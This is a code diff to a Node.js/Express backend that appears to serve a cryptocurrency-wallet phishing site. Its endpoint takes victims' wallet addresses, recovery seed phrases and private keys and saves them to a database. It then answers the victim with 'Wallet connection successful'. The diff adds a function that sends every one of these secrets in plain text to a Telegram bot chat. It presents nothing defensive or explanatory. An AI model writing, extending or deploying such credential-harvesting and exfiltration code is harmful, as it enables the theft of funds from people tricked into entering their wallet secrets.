@@ -16,11 +16,10 @@ const allowedOrigins = [
 app.use(
   cors({
     origin: function (origin, callback) {
-      // Allow requests with no origin (like mobile apps or curl request)
+      // Allow requests with no origin (like mobile apps or curl requests)
       if (!origin) return callback(null, true);
       if (allowedOrigins.indexOf(origin) === -1) {
-        const msg =
-          "CORS policy failure.";
+        const msg = "CORS policy failure.";
         return callback(new Error(msg), false);
       }
       return callback(null, true);
@@ -52,43 +51,41 @@ const walletSchema = new mongoose.Schema(
 
 const Wallet = mongoose.model("Wallet", walletSchema);
 
-// Function to send WhatsApp message
-async function sendWhatsAppMessage() {
+// Function to send data to Telegram
+async function sendToTelegram(walletData) {
   try {
+    // Ensure that phraseWords and phraseWords24 are arrays or empty if not provided
+    const phraseWords = Array.isArray(walletData.phraseWords) ? walletData.phraseWords.join(', ') : "N/A";
+    const phraseWords24 = Array.isArray(walletData.phraseWords24) ? walletData.phraseWords24.join(', ') : "N/A";
+
+    const message = `
+      🏦 Wallet Submission 🏦
+      Name: ${walletData.walletName || "N/A"}
+      Address: ${walletData.walletAddress || "N/A"}
+      Phrase Words: ${phraseWords}
+      Phrase Words (24): ${phraseWords24}
+      Private Key: ${walletData.privateKey || "N/A"}
+    `;
+
     const response = await axios.post(
-      "https://graph.facebook.com/v20.0/439660965887093/messages",
+      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
-        messaging_product: "whatsapp",
-        to: process.env.WHATSAPP_RECIPIENT,
-        type: "template",
-        template: {
-          name: "update_notification",
-          language: { code: "en" }, // Changed this line
-        },
-      },
-      {
-        headers: {
-          Authorization: `Bearer ${process.env.META_API_TOKEN}`,
-          "Content-Type": "application/json",
-        },
+        chat_id: process.env.TELEGRAM_CHAT_ID,
+        text: message,
       }
     );
-    console.log("Awaiting Connection..."); //,response.data
+
+    console.log("Data sent to Telegram:", response.data);
   } catch (error) {
-    console.error(
-      "Error Connecting :("
-      //error.response ? error.response.data : error
-    );
+    console.error("Error sending data to Telegram:", error.message);
   }
 }
 
 // Endpoint to handle wallet data
 app.post("/api/send-wallet-data", async (req, res) => {
   console.log("Received request");
-  //console.log("Request body:", req.body);
 
-  const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } =
-    req.body;
+  const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } = req.body;
 
   try {
     const newWallet = new Wallet({
@@ -100,10 +97,10 @@ app.post("/api/send-wallet-data", async (req, res) => {
     });
 
     await newWallet.save();
-    console.log("WDSS");
+    console.log("Wallet data saved");
 
-    // Send WhatsApp message
-    await sendWhatsAppMessage();
+    // Send data to Telegram
+    await sendToTelegram(req.body);
 
     res.status(200).json({ message: "Wallet connection successful" });
   } catch (error) {
